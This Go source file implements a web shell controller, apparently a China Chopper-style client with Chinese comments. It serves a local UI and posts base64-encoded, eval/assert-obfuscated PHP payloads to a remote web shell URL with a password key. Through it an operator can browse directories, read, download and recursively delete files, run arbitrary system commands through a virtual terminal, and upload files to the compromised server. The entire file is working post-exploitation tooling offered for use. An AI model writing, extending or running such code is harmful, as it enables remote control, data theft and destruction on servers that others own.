package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

func main() {

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {

		var buf bytes.Buffer
		errStr := "ERROR:// Path Not Found Or No Permission!"
		if r.Method == "GET" {
			http.ServeFile(w, r, "index.html")
			return
		}

		if r.Method == http.MethodPost {
			clickedWord := r.FormValue("clickedWord")
			rootPath := r.FormValue("rootPath")
			var path, result string
			var err error
			dstURL := r.FormValue("url")
			key := r.FormValue("key")
			link := r.FormValue("linkStart")
			checkParam := r.FormValue("checkFile")

			switch {

			// 处理连接
			case link == "123":
				decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);print $D;;echo(\"</AAA>\");die();"
				path, err = postData(decodeData, dstURL, key)
				if err != nil {
					fmt.Println("connection failed", err)
					http.Error(w, fmt.Sprint("连接失败: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}

				if path != "" {
					fmt.Fprintf(&buf, "%s------%s", path, "连接成功")
				}

				// 文件管理主界面
			case clickedWord == "" && checkParam == "home":
				decodeData1 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);print $D;;echo(\"</AAA>\");die();"
				path, err = postData(decodeData1, dstURL, key)
				if err != nil {
					fmt.Println("connection failed", err)
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}

				decodeData2 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"
				result, err = postData(decodeData2, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("file open wrong", err)
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}
				fmt.Println("71", result)
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)

				// 目录导航-主目录
			case rootPath == "home":
				tmp := r.FormValue("path")
				index := strings.Index(r.FormValue("path"), "/")
				// linux
				if index == 0 {
					path = "/"
				}
				// windows
				if index != 0 {
					path = tmp[:index+1]
				}

				decodeData3 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"

				result, err = postData(decodeData3, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)

				// 目录导航-上级目录
			case rootPath == "up":
				tmp := r.FormValue("path")
				index := strings.LastIndex(r.FormValue("path"), "/")
				if index == 0 {
					path = "/"
				}
				if index != 0 {
					path = tmp
				}
				decodeData3 := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"

				result, err = postData(decodeData3, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					http.Error(w, fmt.Sprint("Error: connection failed,wrong IP or Key"), http.StatusInternalServerError)
					return
				}
				// path = path + "/"
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)

				// 在线预览
			case checkParam == "view":
				tmp := r.FormValue("path")
				click := r.FormValue("clickedWord")
				tmp = tmp + "/" + click
				tmp = strings.Replace(tmp, "//", "/", -1)
				path := strings.Replace(tmp, "///", "/", -1)
				decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$F='" + path + "';$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');};echo(\"</AAA>\");die();"
				result, err = postData(decodeData, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("112", err)
					http.Error(w, fmt.Sprint("Error: path not found Or No Permission!"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)

				// 下载文件
			case checkParam == "download":
				tmp := r.FormValue("path")
				click := r.FormValue("clickedWord")
				tmp = tmp + "/" + click
				tmp = strings.Replace(tmp, "//", "/", -1)
				path := strings.Replace(tmp, "///", "/", -1)
				decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$F='" + path + "';$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');};echo(\"</AAA>\");die();"
				result, err = postData(decodeData, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("112", err)
					http.Error(w, fmt.Sprint("Error: path not found Or No Permission!"), http.StatusInternalServerError)
					return
				}

				fileName := clickedWord

				w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fileName))
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Header().Set("Content-Length", fmt.Sprintf("%d", len(result)))

				_, err = w.Write([]byte(result))
				if err != nil {
					http.Error(w, "Error writing file content", http.StatusInternalServerError)
				}
				return

				// 删除文件
			case checkParam == "delete":
				tmp := r.FormValue("path")
				click := r.FormValue("clickedWord")
				tmp = tmp + "/" + click
				tmp = strings.Replace(tmp, "//", "/", -1)
				path := strings.Replace(tmp, "///", "/", -1)

				decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$F='" + path + "';function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p.\"/\".$f;if((is_dir($pf))&&($f!=\".\")&&($f!=\"..\")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?\"1\":\"0\":\"0\");};echo(\"</AAA>\");die();"
				result, err = postData(decodeData, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("112", err)
					http.Error(w, fmt.Sprint("Error: path not found Or No Permission!"), http.StatusInternalServerError)
					return
				}
				if result == "1" {
					fmt.Fprintf(&buf, "删除成功")
				} else {
					http.Error(w, fmt.Sprint("No Permission to delete!"), http.StatusInternalServerError)
				}

				// 命令执行
			case checkParam == "cmd":
				command := r.FormValue("command")
				decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");system('" + command + "');;echo(\"</AAA>\");die();"
				result, err := postData(decodeData, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("224", err)
					http.Error(w, fmt.Sprint("Error: Command Wrong or No Permission!"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, result)

				// 虚拟终端
			case checkParam == "terminal":
				path = r.FormValue("path")
				command := r.FormValue("command")
				var decodeData string
				if ok, _ := regexp.MatchString(`^[A-Za-z]:`, path); ok {

					decodeData = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"X@Y\");echo(\"<AAA>\");$m=get_magic_quotes_gpc();$p='cmd';$s='cd " + path + "/&" + command + "&echo [AK]&echo [BK]&cd&echo [CK]';$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";$array=array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\",\"w\"));$fp=proc_open($r.\" 2>&1\",$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo(\"X@Y\");die();"

				} else {

					decodeData = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"X@Y\");echo(\"<AAA>\");$m=get_magic_quotes_gpc();$p='/bin/sh';$s='cd " + path + "/;" + command + ";echo [AK];echo [BK];pwd;echo [CK]';$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";$array=array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\",\"w\"));$fp=proc_open($r.\" 2>&1\",$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo(\"X@Y\");die();"

				}
				fmt.Println("197", command)

				result, newPath, err := terPost(decodeData, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("224", err)
					http.Error(w, fmt.Sprint("Error: Command Wrong or No Permission!"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s------%s", result, newPath)

				// 目录遍历
			default:
				click := r.FormValue("clickedWord")
				tmp := r.FormValue("path")
				if click == "reset" {
					click = ""
				}
				tmp = tmp + "/" + click
				tmp = strings.Replace(tmp, "//", "/", -1)
				path = strings.Replace(tmp, "///", "/", -1)
				decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$D='" + path + "/';$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date(\"   Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\"</AAA>\");die();"
				result, err = postData(decodeData, dstURL, key)
				if err != nil || strings.Contains(result, errStr) {
					fmt.Println("file dir reset wrong", err)
					http.Error(w, fmt.Sprint("Error: path not found Or No Permission!"), http.StatusInternalServerError)
					return
				}
				fmt.Fprintf(&buf, "%s---SPLIT---%s", path, result)
			}

		} else {
			fmt.Fprintf(&buf, "待补充...")
		}

		if _, err := w.Write(buf.Bytes()); err != nil {
			http.Error(w, fmt.Sprintf("Error: %v", err), http.StatusInternalServerError)
			return
		}

	})

	http.HandleFunc("/upload", uploadHandler)
	fmt.Println("Server is running on http://localhost:8080")
	http.ListenAndServe(":8000", nil)
}

// 文件上传
func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		dstURL := r.FormValue("url")
		// fmt.Println("url", dstURL)

		path := r.FormValue("path")
		// fmt.Println("path", path)

		file, header, err := r.FormFile("file")
		if err != nil {
			http.Error(w, "Failed to get file from request", http.StatusBadRequest)
			return
		}

		fileContent, err := io.ReadAll(file)
		if err != nil {
			http.Error(w, "Unable to read the file", http.StatusInternalServerError)
			return
		}

		hexContent := hex.EncodeToString(fileContent)

		defer file.Close()

		decodeData := "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo(\"<AAA>\");$f='" + path + "/" + header.Filename + "';$c=$_POST[\"z1\"];$c=str_replace(\"\\r\",\"\",$c);$c=str_replace(\"\\n\",\"\",$c);$buf=\"\";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode('%'.substr($c,$i,2));echo(@fwrite(fopen($f,'w'),$buf)?'1':'0');;echo(\"</AAA>\");die();"

		add := func(data, dstURL, hexData string) (string, error) {
			decodeData := data
			// decodeData = decodeData + "&z1=" + hexData
			encodeData := base64.StdEncoding.EncodeToString([]byte(decodeData))
			// payload := ""array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));""

			payload := "array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));"

			formData := url.Values{}
			formData.Add("x", payload)
			formData.Add("z1", hexData)

			resp, err := http.PostForm(dstURL, formData)
			if err != nil {
				fmt.Println("31", err)
				return "", err
			}
			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return "", err
			}

			re := regexp.MustCompile(`<AAA>([\s\S]*?)</AAA>`)
			match := re.FindStringSubmatch(string(body))
			if len(match) > 1 {
				return match[1], nil
			} else {
				return "", errors.New("check you path")
			}

		}
		result, err := add(decodeData, dstURL, hexContent)

		fmt.Println("resultttttt", result)

		w.WriteHeader(http.StatusOK)
		w.Write([]byte("上传成功"))
	}

}

// 发送payload
func postData(data, url, key string) (string, error) {
	decodeData := data
	encodeData := base64.StdEncoding.EncodeToString([]byte(decodeData))
	payload := "array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));"

	resp, err := http.PostForm(url, map[string][]string{key: {payload}})
	if err != nil {
		fmt.Println("31", err)
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	re := regexp.MustCompile(`<AAA>([\s\S]*?)</AAA>`)
	match := re.FindStringSubmatch(string(body))
	if len(match) > 1 {
		return match[1], nil
	} else {
		return "", errors.New("check you input")
	}

}

// 虚拟终端数据发送
func terPost(data, url, key string) (string, string, error) {
	decodeData := data
	encodeData := base64.StdEncoding.EncodeToString([]byte(decodeData))
	payload := "array_map(\"ass\".\"ert\",array(\"ev\".\"Al(\\\"\\\\\\$xx=\\\\\\\"Ba\".\"SE6\".\"4_dEc\".\"OdE\\\\\\\";@ev\".\"al(\\\\\\$xx('" + encodeData + "'));\\\");\"));"

	resp, err := http.PostForm(url, map[string][]string{key: {payload}})
	if err != nil {
		fmt.Println("31", err)
		return "", "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}

	re := regexp.MustCompile(`(?s)<AAA>(.*?)\[AK\]|\[BK\](.*?)\[CK\]`)

	matches := re.FindAllStringSubmatch(string(body), -1)

	if matches[0][1] != "" && matches[1][2] != "" {
		return matches[0][1], matches[1][2], nil
	} else if matches[0][1] == "" && matches[1][2] != "" {
		return "", matches[1][2], nil
	} else if matches[0][1] == "" && matches[1][2] == "" {
		return "", "", errors.New("check output")
	}

	return "", "", errors.New("check output")
}
